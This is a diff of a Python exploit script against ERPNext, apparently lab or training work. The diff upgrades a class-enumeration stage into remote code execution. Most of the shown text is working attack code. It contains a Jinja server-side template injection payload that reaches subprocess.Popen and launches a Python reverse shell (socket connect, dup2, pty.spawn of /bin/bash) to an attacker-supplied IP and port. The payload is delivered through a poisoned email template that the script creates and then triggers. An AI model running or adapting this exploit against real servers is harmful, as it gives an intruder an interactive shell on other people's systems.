@@ -1,7 +1,7 @@
 import requests
 import json
 import random, string
-import re
+import sys
 '''
 global websearch returns responses in json
 Ex
@@ -141,7 +141,10 @@ def trigger_ssti_email_template(session, url, template_name, user, ssti, proxies
         exit(1)
 
 if __name__ == '__main__':
-    url = "http://erpnext:8000/"
+    if len(sys.argv) < 4:
+        print(F"Usage: python3 {sys.argv[0]} <target ip> <your ip> <your port> ")
+    
+    url = F"http://{sys.argv[1]}:8000/"
     session = requests.session()
     proxies = {
         'http': '127.0.0.1:8080',
@@ -159,30 +162,10 @@ if __name__ == '__main__':
     template_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
     # a template to enumerate all of the subclasses of object
     # we are interested in the index of open
-    ssti = '{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} {% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} {% set subclasses_r = mro_r[1]|attr(subclasses)() %} {{ subclasses_r }}'
-    print(template_name)
-    create_email_template(session, url, user, template_name, ssti)
-    res = trigger_ssti_email_template(session, url, template_name, user, ssti)
-    classes = res['message']['message']
-    classes = re.sub(r'^.*?\[','', classes)
-    classes = re.sub(r']</div>$','', classes)
-    #classes = re.sub(r'"','', classes)
-    classes = classes.split(', ') 
-#    classes = re.split(',\s?<', classes)
-    #print(classes)
-    print(classes[150])
-    print(classes[151])
-    print(classes[152])
-    print(classes[153])
-    print('Num classes: ',len(classes))
-    count = 0
-    popen_index = -1
-    for c in classes:
-        if 'class' not in c:
-            print(F'index: {count} | {c}')
-        if 'subprocess.Popen' in c:
-            #print(F'index: {count} | {c}')
-            popen_index = count
-            break
-        count += 1
-    print(F'popen index:{popen_index}')
+    enumerate_classes_ssti = '{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} {% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} {% set subclasses_r = mro_r[1]|attr(subclasses)() %} {{ subclasses_r }}'
+
+    # Notice here we had to escape all the '%' for us to be able to supply the ip and port of the reverse shell
+    rce_ssti = '{%% set string = \\\"ssti\\\" %%} {%% set class = \\\"__class__\\\" %%} {%% set mro = \\\"__mro__\\\" %%} {%% set subclasses = \\\"__subclasses__\\\" %%} {%% set mro_r = string|attr(class)|attr(mro) %%} {%% set subclasses_r = mro_r[1]|attr(subclasses)() %%} {%% for x in subclasses_r %%} {%% if \'Popen\' in x|attr(\'__qualname__\')%%} {{ x([\\\"/usr/bin/python3\\\",\\\"-c\\\",\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'%s\', %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\'/bin/bash\')\\\"]) }} {%% endif %%}{%% endfor %%}' % (sys.argv[2], sys.argv[3])
+    print(F"Poisoned email template: {template_name}")
+    create_email_template(session, url, user, template_name, rce_ssti)
+    res = trigger_ssti_email_template(session, url, template_name, user, rce_ssti)
